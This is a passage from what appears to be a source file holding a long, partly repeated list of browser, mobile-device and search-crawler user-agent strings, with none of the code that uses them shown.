               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
               'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)',
               'Mozilla/4.0 (compatible; Arachmo)', 'Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
               'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
               'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
               'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)',
               'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1',
               'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
               'Mozilla/5.0 (PLAYSTATION 3; 3.55)', 'Mozilla/5.0 (PLAYSTATION 3; 2.00)',
               'Mozilla/5.0 (PLAYSTATION 3; 1.00)',
               'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0',
               'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)',
               'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
